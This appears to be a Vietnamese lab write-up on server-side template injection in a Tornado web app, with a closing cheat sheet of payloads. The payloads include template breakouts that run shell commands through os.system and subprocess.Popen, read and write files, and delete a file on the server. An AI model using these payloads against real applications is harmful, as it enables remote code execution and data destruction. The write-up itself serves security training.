# Lab Basic server-side template injection (code context)
* lab này sử dụng template tornado
* Một số điều cần lưu ý khi khai thác: 
* {% %} : được sử dụng để thực thi python code mà không trả về bất cứ giá trị nào. Ví dụ như: lệnh điều kiện if else, lệnh lặp for while,.. ,Thẻ {{ }}: được sử dụng để chèn một giá trị nào đó mà bạn muốn xuất ra trên View,{# #} comment,{% include filename %} . Link mọi người có thể coi thêm https://www.tornadoweb.org/en/stable/template.html
* Tìm endpoint đẩy vào thui 
* ![image](https://user-images.githubusercontent.com/20487674/128597282-8689ba56-287c-4449-83ed-d0a847a5cd7d.png)
* Do mình đã từng sử dụng flask template  Jinja2 so với tornado chỉ hơn khác chút , nên mình focus chỗ user.name
* ![image](https://user-images.githubusercontent.com/20487674/128597403-6c26c8ea-a51a-4e56-ac5d-3881fe0490d6.png)
* Theo như mình đã có code qua thì user.name sẽ được bọc dấu {{user.name}}, thử xem chèn payload xem thử coi có hoạt động không
* ![image](https://user-images.githubusercontent.com/20487674/128597513-8635156e-3685-4e36-8c63-fd2a82c9305d.png)
* ![image](https://user-images.githubusercontent.com/20487674/128597522-5ef770e9-d2f9-4b05-854a-7bd4198d2e4f.png)
* Quá ngon tiếp chèn payload vào thì đây mình có 2 cách 
* Payload: }}{%import os%}{{os.system('ls -lia')
* ![image](https://user-images.githubusercontent.com/20487674/128597605-6ec979ec-ec2e-4114-86e6-3cb74e89af06.png)
* ![image](https://user-images.githubusercontent.com/20487674/128597632-815a88b2-72d5-4538-8abe-65990a11e933.png)
* Payload: \_\_import__('os').system('ls -lia')
* ![image](https://user-images.githubusercontent.com/20487674/128597719-1f61d6a4-97e0-4202-a82e-dfbcb8f19587.png)
* ![image](https://user-images.githubusercontent.com/20487674/128597725-97dee704-3cc0-4032-9cb2-e2680daa6f8b.png)
* ![image](https://user-images.githubusercontent.com/20487674/128597677-05e0e689-302b-4480-8802-af747b9e7d38.png)
* ![image](https://user-images.githubusercontent.com/20487674/128597632-815a88b2-72d5-4538-8abe-65990a11e933.png)
* Xóa file thui nào: \_\_import__('os').remove('morale.txt')
* ![image](https://user-images.githubusercontent.com/20487674/128597852-295b606d-4e5f-48b4-a23d-30abcd3059a4.png)
# Note SSTI Template tornado <a name="sst-python-tornado">
* Test vuln
* {{3*'3'}} => return 3 3 3
* Read and write file
* open('morale.txt').read()
* open('huuphuc.txt','w').write('hello')
* Get Current Directory
* {{\_\_import__('os').getcwd()}} 
* Get list folder and file
* {{\_\_import__('os').listdir(path)}} 
* RCE
* {%import os%}{{os.system('ls -lia')}}
* {{\_\_import__('os').system('ls -lia')}}      
* {{\_\_import__('subprocess').Popen('ls+-lia',shell=True,stdout=-1).communicate()[0]}}
